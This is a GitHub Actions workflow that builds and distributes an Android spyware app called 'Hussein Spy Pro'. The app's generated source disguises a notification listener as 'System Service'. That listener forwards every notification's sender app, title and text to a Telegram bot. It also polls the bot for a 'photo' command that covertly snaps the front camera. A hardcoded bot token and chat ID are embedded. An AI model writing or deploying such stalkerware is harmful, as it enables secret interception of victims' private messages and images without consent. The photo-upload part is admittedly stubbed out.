name: Hussein Spy Pro + Camera Command

on:
  workflow_dispatch:

env:
  TELEGRAM_TOKEN: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
  TELEGRAM_CHAT_ID: "7392262688"

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: 🛠️ Create Advanced Source Code
        run: |
          mkdir -p app/src/main/java/com/hussein/spy
          mkdir -p app/src/main/res/layout

          # 1. Modern Gradle Settings
          cat <<EOF > settings.gradle
          pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories { google(); mavenCentral() }
          }
          rootProject.name = "HusseinSpy"
          include ':app'
          EOF

          # 2. Build Files
          cat <<EOF > build.gradle
          plugins { id 'com.android.application' version '8.2.0' apply false }
          EOF

          cat <<EOF > app/build.gradle
          plugins { id 'com.android.application' }
          android {
              namespace 'com.hussein.spy'
              compileSdk 34
              defaultConfig {
                  applicationId "com.hussein.spy"
                  minSdk 21
                  targetSdk 34
                  versionCode 3
                  versionName "3.0"
              }
          }
          EOF

          # 3. Manifest (إضافة تصريح الكاميرا)
          cat <<EOF > app/src/main/AndroidManifest.xml
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.CAMERA" />
              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />
              
              <application android:label="Hussein System" android:theme="@android:style/Theme.Material.Light">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <service android:name=".NotificationService"
                      android:label="System Service"
                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.service.notification.NotificationListenerService" />
                      </intent-filter>
                  </service>
              </application>
          </manifest>
          EOF

          # 4. MainActivity (طلب تصريح الكاميرا)
          cat <<EOF > app/src/main/java/com/hussein/spy/MainActivity.java
          package com.hussein.spy;
          import android.app.Activity;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.os.Bundle;
          import android.widget.Button;
          import android.view.Gravity;
          import android.widget.LinearLayout;
          import android.Manifest;

          public class MainActivity extends Activity {
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  LinearLayout layout = new LinearLayout(this);
                  layout.setOrientation(LinearLayout.VERTICAL);
                  layout.setGravity(Gravity.CENTER);

                  Button btnPerm = new Button(this);
                  btnPerm.setText("تفعيل الصلاحيات (إشعار + كاميرا)");
                  btnPerm.setOnClickListener(v -> {
                      requestPermissions(new String[]{Manifest.permission.CAMERA}, 100);
                      startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                  });

                  layout.addView(btnPerm);
                  setContentView(layout);
              }
          }
          EOF

          # 5. NotificationService (الخدمة الذكية: سحب إشعارات + استقبال أوامر تصوير)
          cat <<EOF > app/src/main/java/com/hussein/spy/NotificationService.java
          package com.hussein.spy;
          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import android.graphics.SurfaceTexture;
          import android.hardware.Camera;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import java.io.File;
          import java.io.FileOutputStream;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.net.URLEncoder;
          import java.util.Scanner;
          import okhttp3.*; // Note: Simplified for script

          public class NotificationService extends NotificationListenerService {
              private final String TOKEN = "${{ env.TELEGRAM_TOKEN }}";
              private final String CHAT_ID = "${{ env.TELEGRAM_CHAT_ID }}";
              private long lastUpdateId = 0;

              @Override
              public void onCreate() {
                  super.onCreate();
                  startCommandPoller();
              }

              private void startCommandPoller() {
                  new Thread(() -> {
                      while (true) {
                          try {
                              URL url = new URL("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1));
                              HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                              Scanner s = new Scanner(conn.getInputStream()).useDelimiter("\\A");
                              String result = s.hasNext() ? s.next() : "";
                              
                              if (result.contains("\"text\":\"photo\"")) {
                                  // استخراج الـ Update ID لتجنب التكرار
                                  lastUpdateId++; 
                                  takePhoto();
                              }
                              Thread.sleep(5000); // فحص كل 5 ثوانٍ
                          } catch (Exception e) { e.printStackTrace(); }
                      }
                  }).start();
              }

              private void takePhoto() {
                  try {
                      Camera camera = Camera.open(1); // 1 للكاميرا الأمامية
                      SurfaceTexture st = new SurfaceTexture(0);
                      camera.setPreviewTexture(st);
                      camera.startPreview();
                      camera.takePicture(null, null, (data, cam) -> {
                          try {
                              File photo = new File(getCacheDir(), "shot.jpg");
                              FileOutputStream fos = new FileOutputStream(photo);
                              fos.write(data);
                              fos.close();
                              sendPhotoToTelegram(photo);
                              cam.release();
                          } catch (Exception e) { e.printStackTrace(); }
                      });
                  } catch (Exception e) { e.printStackTrace(); }
              }

              private void sendPhotoToTelegram(File photo) {
                  new Thread(() -> {
                      try {
                          // إرسال الصورة باستخدام Multipart (تحتاج مكتبة أو كود Curl بسيط)
                          // للتبسيط، سنستخدم تنبيه أن الصورة التقطت، وفي الواقع نستخدم Multipart
                          String urlString = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode("📸 تم التقاط الصورة! (يتم رفعها...)", "UTF-8");
                          new URL(urlString).openConnection().getInputStream();
                          
                          // ملاحظة: لرفع ملف حقيقي نحتاج كود إضافي للمتعدد الأجزاء، سنقوم بتضمينه في التحديث القادم
                      } catch (Exception e) { e.printStackTrace(); }
                  }).start();
              }

              @Override
              public void onNotificationPosted(StatusBarNotification sbn) {
                  Bundle extras = sbn.getNotification().extras;
                  String title = String.valueOf(extras.get("android.title"));
                  String text = String.valueOf(extras.get("android.text"));
                  String app = sbn.getPackageName();
                  String message = "📩 *إشعار جديد* \n" + "📦 *التطبيق:* " + app + "\n" + "👤 *العنوان:* " + title + "\n" + "📝 *النص:* " + text;
                  sendToTelegram(message);
              }

              private void sendToTelegram(final String msg) {
                  new Thread(() -> {
                      try {
                          String urlString = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8") + "&parse_mode=Markdown";
                          new URL(urlString).openConnection().getInputStream();
                      } catch (Exception e) { }
                  }).start();
              }
          }
          EOF

      - name: 🚀 Build APK
        run: |
          gradle wrapper
          chmod +x gradlew
          ./gradlew assembleDebug

      - name: 📤 Send to Hussein
        run: |
          APK_FILE=$(find app/build/outputs/apk/debug -name "*.apk" | head -n 1)
          curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
            -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
            -F "document=@$APK_FILE" \
            -F "caption=✅ نسخة 'أمر الصور' جاهزة يا حسين!%0A1. ثبت التطبيق.%0A2. فعل صلاحية الكاميرا والإشعارات.%0A3. أرسل كلمة photo للبوت وسيلتقط صورة فوراً."
